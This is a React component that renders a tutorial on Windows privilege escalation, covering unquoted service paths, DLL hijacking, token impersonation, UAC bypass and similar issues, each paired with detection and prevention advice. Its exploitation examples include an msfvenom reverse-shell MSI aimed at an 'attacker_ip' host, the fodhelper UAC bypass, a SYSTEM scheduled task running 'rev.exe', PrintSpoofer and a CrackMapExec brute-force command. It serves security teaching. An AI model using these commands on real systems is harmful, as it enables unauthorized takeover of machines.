import { useEffect, useRef } from "react";
// import "./TypesOfPrivilegeEscalation.css";

const WindowsPrivilegeEscalationDemo = ({ setRef }) => {
  const sectionRefs = {
    UnquotedServicePaths: useRef(null),
    RegistryMisconfig: useRef(null),
    InsecureServicePermissions: useRef(null),
    AlwaysInstallElevated: useRef(null),
    InsecureFilePermissions: useRef(null),
    InsecureDlls: useRef(null),
    WeakPasswordPolicies: useRef(null),
    TokenImpersonation: useRef(null),
    UacBypass: useRef(null),
    ScheduledTasks: useRef(null),
    PatchedVulnerabilities: useRef(null),
    ActiveDirectoryExploitation: useRef(null),
  };

  useEffect(() => {
    setRef((sectionId) => {
      const section = sectionRefs[sectionId];
      if (section && section.current) {
        section.current.scrollIntoView({ behavior: "smooth" });
      }
    });
  }, [setRef]);

  return (
    <div className="types-container">
      {/* === Unquoted Service Paths === */}
      <h2 ref={sectionRefs.UnquotedServicePaths}>Unquoted Service Paths</h2>

      <p>
        Unquoted service paths occur when a Windows service executable path contains spaces and is not enclosed in double quotes. This can lead to privilege escalation if an attacker can place a malicious executable in a location that Windows will try to execute instead of the intended service.
      </p>

      <h3>🧠 What Are Unquoted Service Paths?</h3>
      <p>
        An unquoted service path is a Windows service configuration issue where the file path to an executable is not enclosed in quotes, and the path contains spaces. For example, <code>C:\Program Files\MyApp\myservice.exe</code> should be quoted as <code>"C:\Program Files\MyApp\myservice.exe"</code>. If not, the system might interpret the path incorrectly, potentially executing a malicious program.
      </p>

      <h3>🔍 How to Find Unquoted Service Paths</h3>
      <p>
        Use tools like <a href="https://github.com/PowerShellMafia/PowerUp" target="_blank" rel="noreferrer">PowerUp.ps1</a> to identify unquoted service paths. You can also check the Windows registry manually or use PowerShell scripts to list services and their paths.
      </p>
      <pre>
        <code>
          {`Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -match " " } | Select-Object Name, PathName`}
        </code>
      </pre>


      <h3>📚 Finding Exploits</h3>
      <p>
        Once you identify unquoted service paths, you can exploit the vulnerability by placing a malicious executable in a location Windows might try to run. This can happen if you place the executable in a path like <code>C:\Program.exe</code>, which would be executed instead of the legitimate service.
      </p>

      <h3>💥 Exploitation Example</h3>
      <p>
        If a service is running with an unquoted path and the path is <code>C:\Program Files\MyApp\myservice.exe</code>, an attacker could place a malicious executable named <code>Program.exe</code> in <code>C:\</code>. When the service is started, Windows could execute the malicious <code>Program.exe</code> instead of the legitimate one.
      </p>
      <pre>
        <code>
          # Exploitation Command Example
          copy evil.exe C:\Program.exe
          net start "MyService"
        </code>
      </pre>

      <h3>🛡️ How to Prevent Unquoted Service Paths</h3>
      <ul>
        <li>Always quote service paths in the registry to prevent misinterpretation of file paths.</li>
        <li>Regularly audit Windows services to check for unquoted paths.</li>
        <li>Use tools like <a href="https://github.com/PowerShellMafia/PowerUp" target="_blank" rel="noreferrer">PowerUp.ps1</a> to automate the detection of this vulnerability.</li>
      </ul>


      {/* === Registry Misconfigurations === */}
      <h2 ref={sectionRefs.RegistryMisconfig}>Registry Misconfigurations</h2>
      <p>
        Registry misconfigurations occur when improper permissions or insecure settings are applied to registry keys, which may allow attackers to escalate their privileges or execute arbitrary code.
      </p>

      <h3>🧠 What are Registry Misconfigurations?</h3>
      <p>
        Windows registry is a hierarchical database storing settings and options for the OS. Misconfigurations in the registry can lead to privilege escalation or arbitrary code execution. It can happen when registry keys are given improper permissions or sensitive keys are left exposed.
      </p>

      <h3>🔍 How to Identify Misconfigured Registry Keys</h3>
      <p>
        Use the following PowerShell command to list registry keys with weak permissions:
      </p>
      <pre>
        <code>
          Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object *
        </code>
      </pre>
      <p>
        This command lists the registry entries in the "Run" key, which is often abused by attackers to establish persistence.
      </p>

      <h3>📚 Common Registry Keys Used for Privilege Escalation</h3>
      <ul>
        <li><strong>HKLM:\Software\Microsoft\Windows\CurrentVersion\Run</strong> - Programs configured to start with Windows.</li>
        <li><strong>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</strong> - Programs configured to start for the current user.</li>
        <li><strong>HKCU\Control Panel\Desktop</strong> - Registry keys controlling the desktop environment.</li>
      </ul>

      <h3>💥 Exploitation Example (DLL Hijacking via Registry)</h3>
      <p>
        An attacker can exploit registry misconfigurations to execute arbitrary code, such as DLL hijacking. Here's an example of how an attacker can manipulate a vulnerable registry key to load a malicious DLL:
      </p>
      <pre>
        <code>
          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousApp" /t REG_SZ /d "C:\path\to\malicious.dll"
        </code>
      </pre>
      <p>
        After running this command, the malicious DLL will be executed when the user logs in, allowing an attacker to gain control over the system.
      </p>

      <h3>🛡️ How to Prevent Registry Misconfigurations</h3>
      <ul>
        <li>Regularly audit registry keys for weak permissions using tools like <code>Regedit</code> or PowerShell.</li>
        <li>Limit the access to sensitive registry keys (e.g., using <code>icacls</code> or group policies).</li>
        <li>Ensure that applications do not write to insecure registry locations like <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</strong>.</li>
      </ul>


      {/* === Insecure Service Permissions === */}

      <h2 ref={sectionRefs.InsecureServicePermissions}>Insecure Service Permissions</h2>
      <p>
        Insecure service permissions occur when a Windows service has improper or overly permissive access controls, allowing attackers to escalate their privileges or manipulate the service to execute malicious code.
      </p>

      <h3>🧠 What are Insecure Service Permissions?</h3>
      <p>
        Services in Windows are background processes that perform various functions. If a service has weak permissions, such as allowing non-administrative users to modify or interact with it, attackers may exploit these vulnerabilities to execute arbitrary code or escalate privileges.
      </p>

      <h3>🔍 How to Identify Insecure Service Permissions</h3>
      <p>
        You can use PowerShell to check the permissions on system services. Here's a simple command to list services and their associated file paths:
      </p>
      <pre>
        <code>
          Get-WmiObject -Class Win32_Service | Select-Object Name, StartName, PathName
        </code>
      </pre>
      <p>
        This will list the services along with the account used to run them and the file paths. Pay close attention to any services running with SYSTEM or ADMINISTRATOR privileges but with file paths that are writable by normal users.
      </p>

      <h3>📚 Common Service Misconfigurations</h3>
      <ul>
        <li><strong>Writable Service Binaries</strong>: If a service's executable is writable by a non-administrative user, they can replace it with a malicious binary.</li>
        <li><strong>Improper Service Permissions</strong>: If a service's configuration allows non-administrative users to interact with or modify it, they can manipulate the service to gain elevated privileges.</li>
        <li><strong>Services Running with Weak Accounts</strong>: Services running with user accounts that have unnecessary privileges are more prone to exploitation.</li>
      </ul>

      <h3>💥 Exploitation Example (Writable Service Binary)</h3>
      <p>
        One of the most common forms of insecure service permissions is when a service's executable is stored in a directory that is writable by a non-administrative user. In this scenario, the attacker can replace the legitimate executable with a malicious one to gain elevated privileges once the service is started.
      </p>

      <p>
        For example, let’s assume there is a Windows service called <code>MyService</code> that runs with SYSTEM privileges. The executable for this service is stored in the directory <code>C:\Program Files\MyService</code>, but the directory is configured such that normal users can write to it (e.g., due to misconfigured NTFS permissions).
      </p>

      <p>
        The attacker can exploit this by replacing the legitimate <code>MyService.exe</code> file with a malicious executable (e.g., a backdoor that grants the attacker remote access to the system). Once the attacker replaces the file, they can trigger the service to start again by using the following command:
      </p>
      <pre>
        <code>
          net stop MyService
          net start MyService
        </code>
      </pre>

      <p>
        After the service restarts, it would load the malicious executable instead of the legitimate one, and the attacker could gain SYSTEM-level privileges, allowing them to perform any action on the system.
      </p>

      <h3>🛡️ How to Prevent Insecure Service Permissions</h3>
      <ul>
        <li>Regularly audit services and their associated permissions using tools like <code>sc query</code> or <code>PowerShell</code>.</li>
        <li>Ensure services are running with the least privileged account necessary for operation.</li>
        <li>Ensure that service binaries are only writable by administrators.</li>
        <li>Configure services to not accept input or manipulation from non-administrative users unless absolutely necessary.</li>
      </ul>


      {/* === AlwaysInstallElevated === */}

      <h2 ref={sectionRefs.AlwaysInstallElevated}>AlwaysInstallElevated</h2>
      <p>
        The "AlwaysInstallElevated" feature in Windows can allow non-administrative users to install software with elevated privileges, leading to privilege escalation. This vulnerability is most commonly found in Windows environments that allow users to install software without restrictions.
      </p>

      <h3>🧠 What is AlwaysInstallElevated?</h3>
      <p>
        "AlwaysInstallElevated" is a registry setting that allows Windows Installer to run installations with elevated privileges, even if the user installing the software does not have administrative rights. If enabled, non-administrative users can install software that modifies system settings or executes malicious code with elevated privileges.
      </p>

      <h3>🔍 How to Check for AlwaysInstallElevated</h3>
      <p>
        You can check if the "AlwaysInstallElevated" setting is enabled by querying the Windows registry using PowerShell:
      </p>
      <pre>
        <code>
          Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
        </code>
      </pre>
      <p>
        If the value of "AlwaysInstallElevated" is set to 1, the system is vulnerable. To mitigate this, the registry value should be set to 0, or the key should be removed entirely.
      </p>

      <h3>📚 Exploiting AlwaysInstallElevated</h3>
      <p>
        If the "AlwaysInstallElevated" setting is enabled, an attacker can craft a malicious MSI file that, when installed, grants elevated privileges. This can be exploited by social engineering, convincing the user to install the malicious MSI file, which would execute with administrator privileges.
      </p>

      <h3>💥 Example of Exploitation (Malicious MSI Installation)</h3>
      <p>
        In this example, an attacker creates a reverse shell payload using the <code>msfvenom</code> tool, and then crafts a malicious MSI installer:
      </p>
      <pre>
        <code>
          msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o malicious_installer.msi
        </code>
      </pre>
      <p>
        The attacker then sends the MSI file to the target. Once the target installs it, the attacker's reverse shell connects back to the attacker's machine with elevated privileges, allowing the attacker full control over the system.
      </p>

      <h3>🛡️ How to Prevent AlwaysInstallElevated Exploits</h3>
      <ul>
        <li>Disable "AlwaysInstallElevated" by setting the registry value to 0 or removing the registry key entirely.</li>
        <li>Ensure that non-administrative users do not have access to install software that could exploit this feature.</li>
        <li>Regularly audit system settings and ensure that all security policies are up-to-date.</li>
        <li>Use least privilege principles and restrict the installation of software to trusted administrators only.</li>
      </ul>


      {/* === Insecure File Permissions === */}
      <h2 ref={sectionRefs.InsecureFilePermissions}>Insecure File Permissions</h2>
      <h2 ref={sectionRefs.InsecureFilePermissions}>Insecure File Permissions</h2>
      <p>
        Insecure file permissions occur when sensitive files on Windows systems are accessible by unauthorized users or applications, potentially leading to privilege escalation or unauthorized access to sensitive data.
      </p>

      <h3>🧠 What are Insecure File Permissions?</h3>
      <p>
        File permissions in Windows control who can read, write, or execute a file. When these permissions are improperly configured, attackers can gain access to files they shouldn't, potentially allowing them to read sensitive information, modify files, or execute malicious code with elevated privileges.
      </p>

      <h3>🔍 How to Check File Permissions</h3>
      <p>
        You can check file permissions in Windows using the <code>icacls</code> command. For example:
      </p>
      <pre>
        <code>
          icacls "C:\path\to\file"
        </code>
      </pre>
      <p>
        This command will display the file permissions for the specified file or directory. Pay attention to files that are readable, writable, or executable by users who shouldn't have those permissions, such as non-administrative users.
      </p>

      <h3>📚 Common Examples of Insecure File Permissions</h3>
      <ul>
        <li><strong>World-Writable Files</strong>: Files that are writable by all users, allowing any user to modify the content, which could lead to malicious actions.</li>
        <li><strong>World-Readable Files</strong>: Sensitive files that are readable by everyone, allowing attackers to steal confidential data.</li>
        <li><strong>Executable Files with Insecure Permissions</strong>: If an attacker can modify or replace an executable file with a malicious one, they can exploit the system.</li>
      </ul>

      <h3>💥 Exploitation Example (Writable Program Files)</h3>
      <p>
        A common example of insecure file permissions in Windows is when a program’s executable is writable by a non-administrative user. If this occurs, an attacker could replace the legitimate executable with a malicious one, which would be executed when the program is launched, potentially granting the attacker elevated privileges.
      </p>

      <p>
        For example, let’s assume there’s a program called <code>MyApp.exe</code> installed in <code>C:\Program Files\MyApp\</code>, and the directory is incorrectly configured to allow normal users to write to it (e.g., due to misconfigured NTFS permissions).
      </p>

      <p>
        The attacker could exploit this by replacing <code>MyApp.exe</code> with a malicious executable, such as a backdoor that grants remote access to the attacker. Once the attacker replaces the file, they can execute the malicious program by launching <code>MyApp.exe</code>.
      </p>

      <h3>🛡️ How to Prevent Insecure File Permissions</h3>
      <ul>
        <li>Regularly audit file permissions to ensure that only authorized users have write access to sensitive files or directories.</li>
        <li>Use the principle of least privilege: Only give users the minimum necessary permissions for their tasks.</li>
        <li>Ensure that executable files in sensitive directories (like <code>C:\Program Files\</code>) are not writable by non-administrative users.</li>
        <li>For sensitive files like system configuration files or credentials, ensure that permissions are restricted to only administrators or trusted users.</li>
      </ul>


      {/* === Insecure DLLs === */}
      <h2 ref={sectionRefs.InsecureDlls}>Insecure DLL Hijacking</h2>

      <p>
        Insecure DLL hijacking occurs when an application incorrectly loads a dynamic-link library (DLL) from an insecure or untrusted location, allowing attackers to inject malicious code into the application.
      </p>

      <h3>🧠 What is DLL Hijacking?</h3>
      <p>
        DLL hijacking is a vulnerability that arises when an application loads a DLL file from an untrusted directory, where an attacker can place a malicious DLL with the same name as a legitimate one. When the application is executed, it loads the attacker’s malicious DLL instead of the legitimate one, allowing the attacker to execute arbitrary code with the privileges of the running application.
      </p>

      <h3>🔍 How to Identify DLL Hijacking Vulnerabilities</h3>
      <p>
        To identify DLL hijacking vulnerabilities, you need to analyze how an application loads DLL files. Applications typically search for DLL files in certain directories. The order in which directories are searched for a DLL can lead to hijacking if an application loads a DLL from an insecure or untrusted location (e.g., current working directory or user directories).
      </p>
      <p>
        You can use tools like <code>Process Monitor</code> (Procmon) to monitor DLL loading activity and see if any malicious DLL is being loaded from an insecure location:
      </p>
      <pre>
        <code>
          procmon /Minimized /Backingfile C:\procmon_log.txt
        </code>
      </pre>
      <p>
        This command will log the DLL loading activities. Analyze the log to check if any applications are loading DLLs from untrusted locations.
      </p>

      <h3>📚 Common DLL Hijacking Scenarios</h3>
      <ul>
        <li><strong>Application Loads DLL from Current Directory</strong>: Many applications first look in the current working directory for DLL files. If attackers can place a malicious DLL in this directory, it will be loaded instead of the legitimate one.</li>
        <li><strong>Application Loads DLL from User Writable Directories</strong>: Some applications load DLL files from directories where users can write files (e.g., <code>%TEMP%</code>, <code>%APPDATA%</code>, etc.). Attackers can exploit this by placing a malicious DLL in these directories.</li>
        <li><strong>DLLs with No Search Path Restrictions</strong>: Some applications do not define a clear search path or do not restrict where DLLs can be loaded from, allowing attackers to place DLLs in inappropriate locations.</li>
      </ul>

      <h3>💥 Exploitation Example (Hijacking Legitimate DLL)</h3>
      <p>
        Let’s assume a vulnerable application called <code>MyApp.exe</code> that searches for a DLL called <code>libcrypto.dll</code>. The application first checks the current working directory for the DLL. If an attacker can place a malicious <code>libcrypto.dll</code> in the same directory as the application, the malicious DLL will be loaded, instead of the legitimate one.
      </p>

      <p>
        For example, an attacker can create a malicious DLL that opens a reverse shell or steals information when loaded by the application. To exploit this, the attacker could follow these steps:
      </p>

      <ul>
        <li>Create a malicious <code>libcrypto.dll</code> with malicious code.</li>
        <li>Place the malicious DLL in the same directory as <code>MyApp.exe</code>.</li>
        <li>Run <code>MyApp.exe</code>, and the application will load the attacker’s malicious DLL.</li>
      </ul>

      <p>
        Once the application loads the malicious DLL, the attacker can perform their intended actions, such as executing arbitrary code or gaining access to sensitive data.
      </p>

      <h3>🛡️ How to Prevent DLL Hijacking</h3>
      <ul>
        <li>Always use fully qualified paths when loading DLLs. This ensures that only trusted directories are searched for DLLs.</li>
        <li>Use Windows' <code>SetDllDirectory</code> API to specify the search order for DLLs.</li>
        <li>Ensure that applications only load DLLs from trusted locations (e.g., system directories, signed DLLs).</li>
        <li>Restrict write access to sensitive application directories (e.g., <code>C:\Program Files\</code>) to prevent attackers from placing malicious DLLs.</li>
        <li>Regularly audit and monitor DLL loading behavior using tools like <code>Procmon</code> or <code>Process Explorer</code>.</li>
      </ul>

      {/* === Weak Password Policies === */}
      <h2 ref={sectionRefs.WeakPasswordPolicies}>Weak Password Policies</h2>

      <p>
        Weak password policies allow users to create easily guessable or short passwords, which significantly increase the risk of unauthorized access and privilege escalation.
      </p>

      <h3>🧠 What Are Weak Password Policies?</h3>
      <p>
        Weak password policies refer to configurations where password requirements are too lenient—such as allowing short passwords, simple passwords (e.g., "123456"), or not enforcing password expiration. Attackers can exploit this to brute-force or guess credentials and escalate privileges.
      </p>

      <h3>🔍 How to Identify Weak Password Policies</h3>
      <p>
        You can inspect the current password policy using the following PowerShell command:
      </p>
      <pre>
        <code>
          Get-LocalUser | Select-Object Name, PasswordNeverExpires, UserMayChangePassword
        </code>
      </pre>

      <p>Or you can use the <code>net accounts</code> command to check the password policy on the system:</p>
      <pre>
        <code>
          net accounts
        </code>
      </pre>

      <p>This will output useful information such as:</p>
      <ul>
        <li>Minimum password length</li>
        <li>Maximum password age</li>
        <li>Minimum password age</li>
        <li>Lockout threshold</li>
        <li>Lockout duration</li>
      </ul>

      <h3>📚 Examples of Weak Password Settings</h3>
      <ul>
        <li><strong>Minimum password length = 0</strong>: Users can use blank or one-character passwords.</li>
        <li><strong>Password history = 0</strong>: Users can reuse the same password repeatedly.</li>
        <li><strong>Account lockout threshold = 0</strong>: Accounts never get locked after repeated failed login attempts.</li>
      </ul>

      <h3>💥 Exploitation Example (Brute-force Attack)</h3>
      <p>
        If a system allows weak passwords and has no lockout policy, an attacker can use tools like <code>Hydra</code> or <code>CrackMapExec</code> to brute-force user credentials.
      </p>
      <pre>
        <code>
          crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt
        </code>
      </pre>
      <p>
        If even one weak password exists (like "password123"), the attacker can gain access and potentially escalate privileges.
      </p>

      <h3>🛡️ How to Strengthen Password Policies</h3>
      <ul>
        <li>Set a minimum password length (e.g., 12 characters).</li>
        <li>Enforce password complexity (uppercase, lowercase, numbers, special characters).</li>
        <li>Enable password history to prevent reusing old passwords.</li>
        <li>Set account lockout policies to block brute-force attacks.</li>
        <li>Use Group Policy (<code>gpedit.msc</code>) or domain policies to enforce strong password settings.</li>
      </ul>


      {/* === Token Impersonation === */}

      <h2 ref={sectionRefs.TokenImpersonation}>Token Impersonation</h2>
      <p>
        Token impersonation is a technique where an attacker takes over the security token of a higher-privileged user or process to execute commands with elevated privileges on a Windows system.
      </p>

      <h3>🧠 What is Token Impersonation?</h3>
      <p>
        In Windows, access tokens determine the privileges of a user or process. If a process running with low privileges can access or duplicate a token from a higher-privileged process (like SYSTEM or Administrator), it can impersonate that token to perform actions as that user.
      </p>

      <h3>🔍 How to Identify Token Impersonation Opportunities</h3>
      <p>
        Tools like <code>whoami /priv</code> or <code>whoami /groups</code> can show the current privileges of your session. You can also use tools like <code>Incognito</code> (in Meterpreter) or <code>SharpUp</code> to detect impersonable tokens.
      </p>
      <pre>
        <code>
          whoami /priv
          whoami /groups
        </code>
      </pre>
      <p>
        Privileges to look out for:
      </p>
      <ul>
        <li><code>SeImpersonatePrivilege</code></li>
        <li><code>SeAssignPrimaryTokenPrivilege</code></li>
      </ul>

      <h3>💥 Exploitation Example (Using SeImpersonatePrivilege)</h3>
      <p>
        If you have <code>SeImpersonatePrivilege</code> enabled, you can use a tool like <code>Juicy Potato</code> or <code>PrintSpoofer</code> to exploit it.
      </p>
      <p>Example with PrintSpoofer:</p>
      <pre>
        <code>
          PrintSpoofer.exe -i -c cmd.exe
        </code>
      </pre>
      <p>
        This command spawns a new command shell with SYSTEM privileges by exploiting the SeImpersonatePrivilege.
      </p>

      <h3>🛡️ How to Prevent Token Impersonation</h3>
      <ul>
        <li>Do not assign sensitive privileges like SeImpersonate to unnecessary services or users.</li>
        <li>Harden service permissions and minimize the number of processes running as SYSTEM.</li>
        <li>Use security monitoring to detect suspicious privilege abuse behaviors.</li>
      </ul>


      {/* === UAC Bypass === */}
      <h2 ref={sectionRefs.UacBypass}>UAC Bypass</h2>

      <p>
        User Account Control (UAC) is a Windows security feature that prevents unauthorized changes. UAC Bypass occurs when an attacker tricks the system into executing a high-privileged task without triggering a UAC prompt, allowing privilege escalation without user consent.
      </p>

      <h3>🧠 What is UAC?</h3>
      <p>
        UAC (User Account Control) is designed to prevent unauthorized administrative access. When a standard user or process attempts to perform a task requiring elevated privileges, UAC prompts the user for consent.
      </p>

      <h3>🔍 How UAC Bypass Works</h3>
      <p>
        Some Windows binaries are auto-elevated and do not trigger UAC prompts when executed by an administrator. Attackers can abuse these binaries or registry keys to run malicious payloads without warnings.
      </p>

      <h3>💥 Exploitation Example (Using Fodhelper.exe)</h3>
      <p>
        <code>fodhelper.exe</code> is an auto-elevated binary that can be abused for UAC bypass. Attackers can modify certain registry keys to execute commands with elevated privileges silently.
      </p>

      <pre>
        <code>
          reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
          reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
          fodhelper.exe
        </code>
      </pre>
      <p>
        This will launch a command prompt with administrator privileges without triggering a UAC prompt.
      </p>

      <h3>🛡️ How to Prevent UAC Bypass</h3>
      <ul>
        <li>Set UAC to "Always notify" to ensure prompts appear for every elevation.</li>
        <li>Use Group Policy to disable auto-elevation for vulnerable executables.</li>
        <li>Regularly audit the registry and system for unauthorized changes.</li>
        <li>Use tools like Windows Defender Application Control (WDAC) to restrict unauthorized binaries.</li>
      </ul>


      {/* === Scheduled Tasks === */}

      <h2 ref={sectionRefs.ScheduledTasks}>Scheduled Tasks</h2>
      <p>
        Scheduled Tasks are used in Windows to automate the execution of programs or scripts at specified times or intervals. Misconfigured or maliciously created scheduled tasks can allow attackers to maintain persistence or escalate privileges.
      </p>

      <h3>🧠 What are Scheduled Tasks?</h3>
      <p>
        Scheduled Tasks are managed by the Windows Task Scheduler. They can run programs with specific privileges, including SYSTEM. If attackers can modify existing tasks or create new ones with elevated privileges, they can exploit them for persistence or privilege escalation.
      </p>

      <h3>🔍 How to Identify Suspicious Scheduled Tasks</h3>
      <p>
        Use PowerShell to list all scheduled tasks and review their properties:
      </p>
      <pre>
        <code>
          Get-ScheduledTask | Select-Object TaskName, TaskPath, State
        </code>
      </pre>

      <p>
        To get more detailed information, including the action that runs:
      </p>
      <pre>
        <code>
          {`Get-ScheduledTask | ForEach-Object { Get-ScheduledTaskInfo -TaskName $_.TaskName }`}
        </code>
      </pre>


      <h3>💥 Exploitation Example (Creating a Malicious Scheduled Task)</h3>
      <p>
        An attacker with the required privileges might create a new task that executes a malicious script or binary with SYSTEM-level privileges.
      </p>
      <pre>
        <code>
          schtasks /create /tn "Updater" /tr "C:\evil\rev.exe" /sc minute /ru SYSTEM
        </code>
      </pre>
      <p>
        This command creates a scheduled task called "Updater" that runs <code>rev.exe</code> every minute with SYSTEM privileges.
      </p>

      <h3>🛡️ How to Prevent Scheduled Task Abuse</h3>
      <ul>
        <li>Audit scheduled tasks regularly for unauthorized entries.</li>
        <li>Use least privilege principles: avoid granting unnecessary permissions.</li>
        <li>Restrict access to Task Scheduler using group policy or ACLs.</li>
        <li>Monitor logs and alerts for task creation or modification events.</li>
      </ul>


      {/* === Patched Vulnerabilities === */}
      <h2 ref={sectionRefs.PatchedVulnerabilities}>Exploiting Patched Vulnerabilities</h2>

      <p>
        Sometimes systems are not updated regularly, leaving them vulnerable to known and patched exploits. Attackers can use publicly available exploits for privilege escalation if the system hasn't applied the necessary security patches.
      </p>

      <h3>🧠 What are Patched Vulnerabilities?</h3>
      <p>
        Patched vulnerabilities are known security flaws for which fixes (patches) have already been released by vendors. If a system administrator has not installed these updates, attackers can still exploit these old vulnerabilities.
      </p>

      <h3>🔍 How to Identify Unpatched Vulnerabilities</h3>
      <p>
        You can use system info tools to find the OS version, patch level, and build number:
      </p>
      <pre>
        <code>
          systeminfo
        </code>
      </pre>
      <p>
        This command gives details like hotfixes installed, Windows version, and build number. You can compare these with known vulnerabilities for that version.
      </p>

      <h3>📚 Finding Vulnerabilities</h3>
      <ul>
        <li>Search <a href="https://www.exploit-db.com/" target="_blank" rel="noreferrer">Exploit-DB</a> or use tools like <code>searchsploit</code> to look up CVEs for your OS version.</li>
        <li>Use <code>Windows-Exploit-Suggester</code> to automate finding privilege escalation exploits based on system info.</li>
      </ul>
      <pre>
        <code>
          python windows-exploit-suggester.py -i systeminfo.txt -d 2024-04-13-mssb.xls
        </code>
      </pre>

      <h3>💥 Exploitation Example (MS10-015 - KiTrap0D)</h3>
      <p>
        MS10-015 is a well-known privilege escalation vulnerability in Windows due to improper handling of memory in kernel mode. It was patched in 2010, but some older systems may still be vulnerable.
      </p>
      <p>
        Steps:
      </p>
      <ol>
        <li>Get systeminfo from the target machine and save it to a file.</li>
        <li>Run <code>windows-exploit-suggester</code> and check if MS10-015 is applicable.</li>
        <li>Download the exploit and run it locally on the vulnerable machine.</li>
      </ol>
      <pre>
        <code>
          exploit.exe
        </code>
      </pre>
      <p>
        If successful, it spawns a SYSTEM-level shell.
      </p>

      <h3>🛡️ How to Prevent Exploiting Patched Vulnerabilities</h3>
      <ul>
        <li>Keep Windows systems updated with the latest patches and hotfixes.</li>
        <li>Enable automatic updates or establish a regular patch management policy.</li>
        <li>Use vulnerability management tools to identify outdated software and patch gaps.</li>
      </ul>



    </div>
  );
};

export default WindowsPrivilegeEscalationDemo;
